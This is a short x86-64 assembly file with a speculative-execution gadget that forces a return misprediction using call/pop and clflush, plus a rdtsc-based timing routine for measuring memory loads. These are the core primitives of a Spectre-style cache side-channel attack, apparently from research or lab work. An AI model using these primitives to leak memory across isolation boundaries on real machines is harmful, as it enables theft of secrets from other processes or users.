section .text
    global add, spec_ret_gadget, time_memory_load

add:
    mov rax, rdi
    add rax, rsi
    ret


spec_ret_gadget:
    call level_a
    jmp end
level_a:
    call mispredict_return
    ; speculative code goes here
    ; mov qword [rdi], 42
    mov rax, qword [rdi]
    lfence
mispredict_return:
    pop rdi
    clflush [rsp]
    lfence
    ret
end:
    ret

time_memory_load:
    lfence
    rdtsc
    mov rsi, rax
    mov rcx, [rdi]
    lfence
    rdtsc
    sub rax, rsi
    ret
